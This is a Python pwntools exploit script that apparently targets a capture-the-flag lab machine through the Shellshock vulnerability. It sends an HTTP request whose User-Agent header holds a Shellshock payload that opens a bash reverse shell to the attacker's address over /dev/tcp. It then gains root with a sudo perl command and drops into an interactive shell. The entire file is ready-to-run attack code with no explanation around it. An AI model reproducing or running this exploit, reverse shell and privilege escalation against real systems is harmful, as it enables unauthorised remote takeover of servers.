#!/usr/bin/python3
#coding: utf-8

import os
import threading
from pwn import *
from time import sleep

# VariÃ¡veis Globais
targetIP = "10.10.10.56"
reverseShell = "'exec bash -i &>/dev/tcp/10.10.14.11/443 <&1'"
urlVulnerabelToShellShock = f"http://{targetIP}/cgi-bin/user.sh"

lPort = 443
shell = listen(lPort, timeout=5).wait_for_connection()


def sendShellShock():
	info = log.progress("ShellShock")
	sleep(2)
	info.status("Sendind malicious requests via http")
	sleep(2)
	command = f"""curl -H "User-Agent: () {{ :; }}; echo; echo; /bin/bash -c {reverseShell}" {urlVulnerabelToShellShock}"""
	threading.Thread(target=os.system, args=(command,)).start()
	sleep(2)
	info.success("Malicious code has been send!")
	sleep(1)


def privEsc(shell):
	info = log.progress("PrivEsc")
	sleep(2)
	info.status("Trying to get root")
	sleep(2)
	command = """sudo perl -e 'exec "/bin/bash";'"""
	shell.sendline(command)
	shell.sendline("export TERM=xterm")
	shell.sendline("export SHELL=bash")
	shell.sendline("clear")
	sleep(2)
	info.success("You are ROOT now!")
	sleep(1)


def main(shell):
	sendShellShock()
	privEsc(shell)
	shell.interactive()


try:
	main(shell)
except Exception as e:
	log.error(str(e))
